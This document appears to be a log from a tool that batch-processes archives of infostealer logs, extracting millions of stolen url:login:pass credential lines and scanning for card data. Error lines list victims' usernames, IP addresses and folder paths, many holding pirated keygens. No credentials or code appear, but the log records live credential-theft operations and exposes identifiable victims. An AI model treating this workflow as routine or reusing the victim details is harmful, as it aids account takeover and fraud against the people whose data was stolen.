+[2026-06-21 04:03:50] LogsDiller Cloud_667_#245.zip -> COMPLETED SUCCESSFULLY (11.335 url:login:pass found, 296 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:50] SCAN LogsDiller Cloud_672_#52.zip | solid=False type=Zip entries=12716 pwFiles=452 combos=33327 fails=0 time=00:00:00
+[2026-06-21 04:03:50] LogsDiller Cloud_672_#52.zip -> COMPLETED SUCCESSFULLY (26.515 url:login:pass found, 452 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:51] SCAN LogsDiller Cloud_678_#55.zip | solid=False type=Zip entries=15254 pwFiles=253 combos=13866 fails=0 time=00:00:00
+[2026-06-21 04:03:51] LogsDiller Cloud_678_#55.zip -> COMPLETED SUCCESSFULLY (11.505 url:login:pass found, 253 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:51] SCAN LogsDiller Cloud_687_#145.zip | solid=False type=Zip entries=15954 pwFiles=366 combos=28478 fails=0 time=00:00:00
+[2026-06-21 04:03:51] LogsDiller Cloud_687_#145.zip -> COMPLETED SUCCESSFULLY (21.812 url:login:pass found, 366 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:51] SCAN LogsDiller Cloud_691_#62.zip | solid=False type=Zip entries=14414 pwFiles=260 combos=12318 fails=0 time=00:00:00
+[2026-06-21 04:03:51] LogsDiller Cloud_691_#62.zip -> COMPLETED SUCCESSFULLY (10.447 url:login:pass found, 260 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:52] SCAN LogsDiller Cloud_702_#37.zip | solid=False type=Zip entries=13991 pwFiles=293 combos=22749 fails=0 time=00:00:00
+[2026-06-21 04:03:52] LogsDiller Cloud_702_#37.zip -> COMPLETED SUCCESSFULLY (16.187 url:login:pass found, 293 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:53] SCAN LogsDiller Cloud_711_#24.zip | solid=False type=Zip entries=14360 pwFiles=532 combos=43182 fails=0 time=00:00:00
+[2026-06-21 04:03:53] LogsDiller Cloud_711_#24.zip -> COMPLETED SUCCESSFULLY (34.052 url:login:pass found, 532 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:53] SCAN LogsDiller Cloud_712_#247.zip | solid=False type=Zip entries=13315 pwFiles=392 combos=23006 fails=0 time=00:00:00
+[2026-06-21 04:03:53] LogsDiller Cloud_712_#247.zip -> COMPLETED SUCCESSFULLY (17.727 url:login:pass found, 392 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:54] SCAN LogsDiller Cloud_791_#117.zip | solid=False type=Zip entries=15077 pwFiles=312 combos=19480 fails=0 time=00:00:00
+[2026-06-21 04:03:54] LogsDiller Cloud_791_#117.zip -> COMPLETED SUCCESSFULLY (16.468 url:login:pass found, 312 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:54] SCAN LogsDiller Cloud_792_#244.zip | solid=False type=Zip entries=15226 pwFiles=428 combos=26750 fails=0 time=00:00:00
+[2026-06-21 04:03:54] LogsDiller Cloud_792_#244.zip -> COMPLETED SUCCESSFULLY (21.366 url:login:pass found, 428 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:55] SCAN LogsDiller Cloud_925_#57.zip | solid=False type=Zip entries=19351 pwFiles=445 combos=36976 fails=0 time=00:00:00
+[2026-06-21 04:03:55] LogsDiller Cloud_925_#57.zip -> COMPLETED SUCCESSFULLY (28.088 url:login:pass found, 445 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:56] SCAN LogsDiller Cloud_933_#34.zip | solid=False type=Zip entries=16891 pwFiles=597 combos=47499 fails=0 time=00:00:00
+[2026-06-21 04:03:56] LogsDiller Cloud_933_#34.zip -> COMPLETED SUCCESSFULLY (41.094 url:login:pass found, 597 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:56] OPEN FAILED AppNee.com.Corel.All.Products.Universal.Keygen.by.X-Force.2021.V2.7z -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_d4292a2c87324a198db1e162c597d80d\PK[DEDB5BC4F86071A6FCEF72A50FEAA570] [2022-03-16T02_08_05.39\FileGrabber\Users\Farooq\Documents\AppNee.com.Corel.All.Products.Universal.Keygen.by.X-Force.2021.V2.7z'
+[2026-06-21 04:03:56] SCAN LogsDiller Cloud_939_#30.zip | solid=False type=Zip entries=18768 pwFiles=331 combos=17498 fails=0 time=00:00:00
+[2026-06-21 04:03:56] LogsDiller Cloud_939_#30.zip -> COMPLETED SUCCESSFULLY (14.341 url:login:pass found, 331 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:57] OPEN FAILED Keygen.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_1ff05f14f6d540e1a1197644cdf1c2f6\NG[A95F74B3DFB7D297EC46ED50AA106E44] [2022-04-03T04_19_17.24\FileGrabber\Users\CIVIL UNIT\Documents\Keygen.rar'
+[2026-06-21 04:03:57] SCAN LogsDiller Cloud_939_#53.zip | solid=False type=Zip entries=20354 pwFiles=355 combos=24044 fails=0 time=00:00:00
+[2026-06-21 04:03:57] LogsDiller Cloud_939_#53.zip -> COMPLETED SUCCESSFULLY (20.510 url:login:pass found, 355 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:57] SCAN LogsDiller Cloud_945_#255.zip | solid=False type=Zip entries=17081 pwFiles=400 combos=33674 fails=0 time=00:00:00
+[2026-06-21 04:03:57] LogsDiller Cloud_945_#255.zip -> COMPLETED SUCCESSFULLY (26.977 url:login:pass found, 400 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:58] SCAN LogsDiller Cloud_946_#32.zip | solid=False type=Zip entries=18337 pwFiles=398 combos=32504 fails=0 time=00:00:00
+[2026-06-21 04:03:58] LogsDiller Cloud_946_#32.zip -> COMPLETED SUCCESSFULLY (16.784 url:login:pass found, 398 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:58] SCAN LogsDiller Cloud_980_#249.zip | solid=False type=Zip entries=19587 pwFiles=544 combos=35950 fails=0 time=00:00:00
+[2026-06-21 04:03:58] LogsDiller Cloud_980_#249.zip -> COMPLETED SUCCESSFULLY (29.339 url:login:pass found, 544 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:59] SCAN LogsDiller Cloud_983_#250.zip | solid=False type=Zip entries=20091 pwFiles=577 combos=28464 fails=0 time=00:00:00
+[2026-06-21 04:03:59] LogsDiller Cloud_983_#250.zip -> COMPLETED SUCCESSFULLY (23.556 url:login:pass found, 577 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:00] SCAN LogsDiller Cloud_990_#248.zip | solid=False type=Zip entries=20693 pwFiles=600 combos=33646 fails=0 time=00:00:00
+[2026-06-21 04:04:00] LogsDiller Cloud_990_#248.zip -> COMPLETED SUCCESSFULLY (28.154 url:login:pass found, 600 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:00] SCAN LogsDiller Cloud_1011_#257.zip | solid=False type=Zip entries=16881 pwFiles=371 combos=20772 fails=0 time=00:00:00
+[2026-06-21 04:04:00] LogsDiller Cloud_1011_#257.zip -> COMPLETED SUCCESSFULLY (16.719 url:login:pass found, 371 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:01] SCAN LogsDiller Cloud_1208_#141.zip | solid=False type=Zip entries=23608 pwFiles=636 combos=36712 fails=0 time=00:00:00
+[2026-06-21 04:04:01] LogsDiller Cloud_1208_#141.zip -> COMPLETED SUCCESSFULLY (28.279 url:login:pass found, 636 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:02] SCAN LogsDiller Cloud_1221_#108.zip | solid=False type=Zip entries=24045 pwFiles=627 combos=37664 fails=0 time=00:00:00
+[2026-06-21 04:04:02] LogsDiller Cloud_1221_#108.zip -> COMPLETED SUCCESSFULLY (32.703 url:login:pass found, 627 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:02] SCAN LogsDiller Cloud_1233_#102.zip | solid=False type=Zip entries=16807 pwFiles=315 combos=19984 fails=0 time=00:00:00
+[2026-06-21 04:04:02] LogsDiller Cloud_1233_#102.zip -> COMPLETED SUCCESSFULLY (14.975 url:login:pass found, 315 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:03] SCAN LogsDiller Cloud_1246_#51.zip | solid=False type=Zip entries=25388 pwFiles=553 combos=27837 fails=0 time=00:00:00
+[2026-06-21 04:04:03] LogsDiller Cloud_1246_#51.zip -> COMPLETED SUCCESSFULLY (25.059 url:login:pass found, 553 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:03] SCAN LogsDiller Cloud_1251_#258.zip | solid=False type=Zip entries=19542 pwFiles=297 combos=19021 fails=0 time=00:00:00
+[2026-06-21 04:04:03] LogsDiller Cloud_1251_#258.zip -> COMPLETED SUCCESSFULLY (15.443 url:login:pass found, 297 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:04] SCAN LogsDiller Cloud_1252_#252.zip | solid=False type=Zip entries=24657 pwFiles=656 combos=40895 fails=0 time=00:00:00
+[2026-06-21 04:04:04] LogsDiller Cloud_1252_#252.zip -> COMPLETED SUCCESSFULLY (24.568 url:login:pass found, 656 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:05] SCAN LogsDiller Cloud_1335_#58.zip | solid=False type=Zip entries=27706 pwFiles=942 combos=74196 fails=0 time=00:00:01
+[2026-06-21 04:04:05] LogsDiller Cloud_1335_#58.zip -> COMPLETED SUCCESSFULLY (60.179 url:login:pass found, 942 files) [password: no password] [00:00:01]
+[2026-06-21 04:04:06] SCAN LogsDiller Cloud_1386_#43.zip | solid=False type=Zip entries=30186 pwFiles=848 combos=49089 fails=0 time=00:00:00
+[2026-06-21 04:04:06] LogsDiller Cloud_1386_#43.zip -> COMPLETED SUCCESSFULLY (39.707 url:login:pass found, 848 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:07] SCAN LogsDiller Cloud_1411_#100.zip | solid=False type=Zip entries=26140 pwFiles=399 combos=21543 fails=0 time=00:00:00
+[2026-06-21 04:04:07] LogsDiller Cloud_1411_#100.zip -> COMPLETED SUCCESSFULLY (18.579 url:login:pass found, 399 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:07] SCAN LogsDiller Cloud_1433_#246.zip | solid=False type=Zip entries=29555 pwFiles=746 combos=40021 fails=0 time=00:00:00
+[2026-06-21 04:04:08] LogsDiller Cloud_1433_#246.zip -> COMPLETED SUCCESSFULLY (29.401 url:login:pass found, 746 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:08] SCAN LogsDiller Cloud_1442_#254.zip | solid=False type=Zip entries=28537 pwFiles=782 combos=45383 fails=0 time=00:00:00
+[2026-06-21 04:04:08] LogsDiller Cloud_1442_#254.zip -> COMPLETED SUCCESSFULLY (36.019 url:login:pass found, 782 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:09] SCAN LogsDiller Cloud_1468_#114.zip | solid=False type=Zip entries=25226 pwFiles=352 combos=20516 fails=0 time=00:00:01
+[2026-06-21 04:04:09] LogsDiller Cloud_1468_#114.zip -> COMPLETED SUCCESSFULLY (17.367 url:login:pass found, 352 files) [password: no password] [00:00:01]
+[2026-06-21 04:04:10] OPEN FAILED universal.xforce.keygen.Autodesk.2019.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_54daeec5d1c94a54afcc1a3b7da12572\EG[3D412F17FD77A9A708D72AD1758C768C] [2022-03-27T12_32_05.60\FileGrabber\Users\Lenovo\Desktop\universal.xforce.keygen.Autodesk.2019.rar'
+[2026-06-21 04:04:10] SCAN LogsDiller Cloud_1516_#46.zip | solid=False type=Zip entries=28835 pwFiles=650 combos=36242 fails=0 time=00:00:00
+[2026-06-21 04:04:10] LogsDiller Cloud_1516_#46.zip -> COMPLETED SUCCESSFULLY (31.177 url:login:pass found, 650 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:11] SCAN LogsDiller Cloud_1520_#99.zip | solid=False type=Zip entries=24973 pwFiles=368 combos=22375 fails=0 time=00:00:00
+[2026-06-21 04:04:11] LogsDiller Cloud_1520_#99.zip -> COMPLETED SUCCESSFULLY (17.793 url:login:pass found, 368 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:12] SCAN LogsDiller Cloud_1564_#147.zip | solid=False type=Zip entries=31102 pwFiles=914 combos=56738 fails=0 time=00:00:01
+[2026-06-21 04:04:12] LogsDiller Cloud_1564_#147.zip -> COMPLETED SUCCESSFULLY (24.973 url:login:pass found, 914 files) [password: no password] [00:00:01]
+[2026-06-21 04:04:15] SCAN LogsDiller Cloud_1606_#251.zip | solid=False type=Zip entries=33536 pwFiles=915 combos=56056 fails=0 time=00:00:02
+[2026-06-21 04:04:15] LogsDiller Cloud_1606_#251.zip -> COMPLETED SUCCESSFULLY (36.577 url:login:pass found, 915 files) [password: no password] [00:00:02]
+[2026-06-21 04:04:16] SCAN LogsDiller Cloud_1612_#107.zip | solid=False type=Zip entries=34416 pwFiles=831 combos=55012 fails=0 time=00:00:00
+[2026-06-21 04:04:16] LogsDiller Cloud_1612_#107.zip -> COMPLETED SUCCESSFULLY (42.327 url:login:pass found, 831 files) [password: no password] [00:00:01]
+[2026-06-21 04:04:16] SCAN LogsDiller Cloud_1613_#110.zip | solid=False type=Zip entries=30322 pwFiles=432 combos=33707 fails=0 time=00:00:00
+[2026-06-21 04:04:16] LogsDiller Cloud_1613_#110.zip -> COMPLETED SUCCESSFULLY (26.567 url:login:pass found, 432 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:18] SCAN LogsDiller Cloud_1666_#28.zip | solid=False type=Zip entries=33896 pwFiles=1225 combos=85038 fails=0 time=00:00:01
+[2026-06-21 04:04:18] LogsDiller Cloud_1666_#28.zip -> COMPLETED SUCCESSFULLY (70.610 url:login:pass found, 1225 files) [password: no password] [00:00:01]
+[2026-06-21 04:04:18] SCAN LogsDiller Cloud_1722_#106.zip | solid=False type=Zip entries=33750 pwFiles=680 combos=34229 fails=0 time=00:00:00
+[2026-06-21 04:04:18] LogsDiller Cloud_1722_#106.zip -> COMPLETED SUCCESSFULLY (28.650 url:login:pass found, 680 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:19] OPEN FAILED KeyRep by aluth.com.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:04:19] SCAN LogsDiller Cloud_1778_#95.zip | solid=False type=Zip entries=31824 pwFiles=369 combos=19002 fails=0 time=00:00:00
+[2026-06-21 04:04:19] LogsDiller Cloud_1778_#95.zip -> COMPLETED SUCCESSFULLY (16.602 url:login:pass found, 369 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:19] OPEN FAILED produkey.zip -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_f055bdc8cee54f80b0b22889042196a7\CO[558E8C51122D9504FE0A76FD1DFA4E30] [2022-05-19T23_07_08.8833579]\FileGrabber\Users\Mateus\Desktop\produkey.zip'
+[2026-06-21 04:04:20] SCAN LogsDiller Cloud_1781_#116.zip | solid=False type=Zip entries=32267 pwFiles=720 combos=44947 fails=0 time=00:00:00
+[2026-06-21 04:04:20] LogsDiller Cloud_1781_#116.zip -> COMPLETED SUCCESSFULLY (34.642 url:login:pass found, 720 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:21] OPEN FAILED winproductkey.zip -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_593ef39815164132bc5e8b8cd7b88937\MY[1D0091E7402F47BCEAA79A4A304C73DD] [2022-05-10T19_36_54.3295782]\FileGrabber\Users\bardz\Documents\winproductkey.zip'
+[2026-06-21 04:04:21] SCAN LogsDiller Cloud_1792_#104.zip | solid=False type=Zip entries=31092 pwFiles=302 combos=21250 fails=0 time=00:00:01
+[2026-06-21 04:04:21] LogsDiller Cloud_1792_#104.zip -> COMPLETED SUCCESSFULLY (14.946 url:login:pass found, 302 files) [password: no password] [00:00:01]
+[2026-06-21 04:04:22] SCAN LogsDiller Cloud_1858_#113.zip | solid=False type=Zip entries=33503 pwFiles=443 combos=26073 fails=0 time=00:00:00
+[2026-06-21 04:04:22] LogsDiller Cloud_1858_#113.zip -> COMPLETED SUCCESSFULLY (21.519 url:login:pass found, 443 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:23] OPEN FAILED avast_cleanup_premium_22_1_6921_crack___activation_key_download_2022.zip -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:04:23] SCAN LogsDiller Cloud_1878_#109.zip | solid=False type=Zip entries=35460 pwFiles=505 combos=32032 fails=0 time=00:00:00
+[2026-06-21 04:04:23] LogsDiller Cloud_1878_#109.zip -> COMPLETED SUCCESSFULLY (25.766 url:login:pass found, 505 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:25] SCAN LogsDiller Cloud_1909_#115.zip | solid=False type=Zip entries=34979 pwFiles=595 combos=36393 fails=0 time=00:00:01
+[2026-06-21 04:04:25] LogsDiller Cloud_1909_#115.zip -> COMPLETED SUCCESSFULLY (31.398 url:login:pass found, 595 files) [password: no password] [00:00:01]
+[2026-06-21 04:04:27] SCAN LogsDiller Cloud_2070_#111.zip | solid=False type=Zip entries=38134 pwFiles=445 combos=23499 fails=0 time=00:00:02
+[2026-06-21 04:04:27] LogsDiller Cloud_2070_#111.zip -> COMPLETED SUCCESSFULLY (20.097 url:login:pass found, 445 files) [password: no password] [00:00:02]
+[2026-06-21 04:04:28] SCAN LogsDiller Cloud_2111_#105.zip | solid=False type=Zip entries=40185 pwFiles=759 combos=46709 fails=0 time=00:00:00
+[2026-06-21 04:04:28] LogsDiller Cloud_2111_#105.zip -> COMPLETED SUCCESSFULLY (35.266 url:login:pass found, 759 files) [password: no password] [00:00:01]
+[2026-06-21 04:04:31] OPEN FAILED 4MeKey Crack.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:04:31] SCAN LogsDiller Cloud_2511_#98.zip | solid=False type=Zip entries=40988 pwFiles=511 combos=29891 fails=0 time=00:00:02
+[2026-06-21 04:04:31] LogsDiller Cloud_2511_#98.zip -> COMPLETED SUCCESSFULLY (25.158 url:login:pass found, 511 files) [password: no password] [00:00:02]
+[2026-06-21 04:04:32] SCAN LogsDiller Cloud_2519_#101.zip | solid=False type=Zip entries=34169 pwFiles=736 combos=43862 fails=0 time=00:00:00
+[2026-06-21 04:04:32] LogsDiller Cloud_2519_#101.zip -> COMPLETED SUCCESSFULLY (37.349 url:login:pass found, 736 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:34] SCAN LogsDiller Cloud_2523_#118.zip | solid=False type=Zip entries=52888 pwFiles=1611 combos=89797 fails=0 time=00:00:01
+[2026-06-21 04:04:34] LogsDiller Cloud_2523_#118.zip -> COMPLETED SUCCESSFULLY (65.846 url:login:pass found, 1611 files) [password: no password] [00:00:01]
+[2026-06-21 04:04:35] OPEN FAILED Euro.Truck.Simulator.2.1.40.part09.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:04:35] OPEN FAILED Euro.Truck.Simulator.2.1.40.part10.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:04:35] OPEN FAILED Euro.Truck.Simulator.2.1.40.part11.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:04:36] SCAN LogsDiller Cloud_2773_#96.zip | solid=False type=Zip entries=46434 pwFiles=537 combos=34125 fails=0 time=00:00:02
+[2026-06-21 04:04:36] LogsDiller Cloud_2773_#96.zip -> COMPLETED SUCCESSFULLY (27.795 url:login:pass found, 537 files) [password: no password] [00:00:02]
+[2026-06-21 04:04:38] SCAN LogsDiller Cloud_3277_#253.zip | solid=False type=Zip entries=66374 pwFiles=1738 combos=91482 fails=0 time=00:00:01
+[2026-06-21 04:04:38] LogsDiller Cloud_3277_#253.zip -> COMPLETED SUCCESSFULLY (38.352 url:login:pass found, 1738 files) [password: no password] [00:00:01]
+[2026-06-21 04:04:38] OPEN FAILED microsoft.prerelease_protected.mainos_lang_mk-mk.spkg_5718e6d08132face5e266dc09889b1797db20685.cab -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:04:38] SCAN LogsDiller Cloud_Free_240_#195.zip | solid=False type=Zip entries=5077 pwFiles=162 combos=22541 fails=0 time=00:00:00
+[2026-06-21 04:04:38] LogsDiller Cloud_Free_240_#195.zip -> COMPLETED SUCCESSFULLY (15.132 url:login:pass found, 162 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:39] OPEN FAILED VG Tool 4.1_KeyGEN.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_c10a43a24a874f3aab544bf57b3b1f91\23338_MX_189.180.39.74_30_04_2026\Files\Desktop\cel\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 04:04:39] SCAN LogsDiller Cloud_Free_372_#194.zip | solid=False type=Zip entries=8930 pwFiles=245 combos=32103 fails=0 time=00:00:00
+[2026-06-21 04:04:39] LogsDiller Cloud_Free_372_#194.zip -> COMPLETED SUCCESSFULLY (15.444 url:login:pass found, 245 files) [password: no password] [00:00:00]
+[2026-06-21 04:04:41] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 04:04:41] SCAN LogsDiller Cloud_Free_500_#196.zip | solid=False type=Zip entries=10900 pwFiles=372 combos=30085 fails=0 time=00:00:02
+[2026-06-21 04:04:41] LogsDiller Cloud_Free_500_#196.zip -> COMPLETED SUCCESSFULLY (11.105 url:login:pass found, 372 files) [password: no password] [00:00:02]
+[2026-06-21 04:04:42] Archive to ULP finished | unique lines: 3045786 | failed: 0 | elapsed: 00:02:49
+[2026-06-21 04:12:20] ERROR | CC archive Keygen-CORE.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_a101333e5d9b4c2fa541078d0487cb78\MM_103.83.189.10_11-04-26\Files\Desktop\freee4pc.org_UltraISO Premium Edition _ 9.7.6.3829\freee4pc.org_UltraISO Premium Edition Crack 9.7.6.3829\Keygen-CORE.rar'
+[2026-06-21 04:12:20] ERROR | CC archive VG Tool 4.1_KeyGEN.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_a101333e5d9b4c2fa541078d0487cb78\MW_102.70.119.90_08-04-26\Files\Desktop\Adplus 002\Downloads\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 04:13:38] ERROR | CC archive RKT_rockusb-v3.00_2013_pass-1111.7z | DataErrorException: Data Error
+[2026-06-21 04:13:38] ERROR | CC archive RKT_rockusb-v3.00_2013_pass-1111.7z | DataErrorException: Data Error
+[2026-06-21 04:13:38] ERROR | CC archive RKT_rockusb-v3.00_2013_pass-1111.7z | DataErrorException: Data Error
+[2026-06-21 04:14:07] ERROR | CC archive VG Tool 4.1_KeyGEN.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_0752856eb3234961ad2e73fb68647217\MA_160.178.84.35_26-05-26\Files\Desktop\soft\GoogleChacha VG  TOOL 4.1\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 04:14:23] ERROR | CC archive Keygen.rar | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:14:49] ERROR | CC archive RKT_rockusb-v3.00_2013_pass-1111.7z | DataErrorException: Data Error
+[2026-06-21 04:14:49] ERROR | CC archive RKT_rockusb-v3.00_2013_pass-1111.7z | DataErrorException: Data Error
+[2026-06-21 04:14:55] ERROR | CC archive Keygen-FALLEN.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_555bb8e6680946b0a8d16fe6ffe483eb\ZA_165.73.162.88_04-06-26\Files\Desktop\Desktop\free4pc.org_AOMEI Partition Assistant Crack 9.6 With License Key Download [Latest]\Keygen-FALLEN.rar'
+[2026-06-21 04:15:23] ERROR | CC archive RKT_rockusb-v3.00_2013_pass-1111.7z | DataErrorException: Data Error
+[2026-06-21 04:15:23] ERROR | CC archive RKT_rockusb-v3.00_2013_pass-1111.7z | DataErrorException: Data Error
+[2026-06-21 04:15:23] ERROR | CC archive MOBILedit_Forensicpass 789789.rar | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:16:28] ERROR | CC archive VG Tool 4.1_KeyGEN.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_4088939bcb724e18a69a964e5c37839b\MA_41.249.199.206_08-05-26\Files\Desktop\soft\GoogleChacha VG  TOOL 4.1\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 04:16:52] ERROR | CC archive MTK_FP_v1.1123.0_2014_pass_1111.7z | DataErrorException: Data Error
+[2026-06-21 04:17:05] ERROR | CC archive VG Tool 4.1_KeyGEN.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_9d9339ea5a2049f3a7de8649bbac2dde\MA_81.192.142.210_21-04-26\Files\Desktop\repaire soft\GoogleChacha VG  TOOL 4.1\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 04:17:37] ERROR | CC archive VG Tool 4.1_KeyGEN (1).rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_f0ac1370e91247c194c8521107385129\PK_182.188.115.41_18-04-26\Files\Desktop\New folder (3)\VG Tool 4.1_KeyGEN (1).rar'
+[2026-06-21 04:17:38] ERROR | CC archive VG Tool 4.1_KeyGEN (1).rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_f0ac1370e91247c194c8521107385129\PK_39.63.29.185_16-04-26\Files\Desktop\New folder (3)\VG Tool 4.1_KeyGEN (1).rar'
+[2026-06-21 04:17:52] ERROR | CC archive RKT_rockusb-v3.00_pass-1111 (1).7z | DataErrorException: Data Error
+[2026-06-21 04:17:52] ERROR | CC archive RKT_rockusb-v3.00_pass-1111.7z | DataErrorException: Data Error
+[2026-06-21 04:18:26] ERROR | CC archive iggtech.com.xforce.2020v2.keygen.Autodesk.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_b5ccbb06de534aa8aee483e854e4d4a9\BR[A7638B6169B0E9FA29B4AE201CF32E6F] [2022-04-08T08_32_29.09\FileGrabber\Users\Thayrine\Documents\iggtech.com.xforce.2020v2.keygen.Autodesk.rar'
+[2026-06-21 04:18:27] ERROR | CC archive SignCut-Pro-1.95Stable-crack-activation-keygen.rar-Full.zip | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:18:32] ERROR | CC archive Keygen.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_f701c1c31272409fa7a4bc41c3a3e1c4\AR[D38CEA21191629A49A670911E43B021F] [2022-04-06T09_29_50.59\FileGrabber\Users\USUARIO\Documents\Keygen.rar'
+[2026-06-21 04:18:35] ERROR | CC archive Keygen.rar | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:18:36] ERROR | CC archive Corel.Products.MultiKeygen-XFORCE.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_9c4e579a8ddd44a7ba7d0f8d420beab8\BR[937518E8D5D134BEE60D6666465AA6A3] [2022-03-16T14_18_28.56\FileGrabber\Users\USER\Desktop\Corel.Products.MultiKeygen-XFORCE.rar'
+[2026-06-21 04:18:36] ERROR | CC archive icongnghe.com.xforce.2016.keygen.Autodesk.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_9c4e579a8ddd44a7ba7d0f8d420beab8\BR[937518E8D5D134BEE60D6666465AA6A3] [2022-03-16T14_18_28.56\FileGrabber\Users\USER\Desktop\icongnghe.com.xforce.2016.keygen.Autodesk.rar'
+[2026-06-21 04:18:39] ERROR | CC archive keygen 64bit.zip | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_7aa465f40ce74a47a1e16e240adb636b\ID[9340BFDB0142778F2E2291C3BC92F991] [2022-04-16T14_30_19.32\FileGrabber\Users\Windows 10\Documents\keygen 64bit.zip'
